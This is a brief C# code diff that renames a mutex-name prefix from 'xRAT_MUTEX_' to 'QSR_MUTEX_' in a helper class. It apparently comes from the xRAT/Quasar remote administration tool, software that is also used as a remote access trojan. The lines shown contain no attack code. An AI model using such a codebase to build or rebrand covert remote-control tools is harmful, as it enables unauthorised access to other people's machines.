@@ -29,7 +29,7 @@ namespace xServer.Core.Helper
 
         public static string GenerateMutex(int length = 18)
         {
-            return "xRAT_MUTEX_" + FileHelper.GetRandomFilename(length);
+            return "QSR_MUTEX_" + FileHelper.GetRandomFilename(length);
         }
 
         public static bool IsValidVersionNumber(string input)
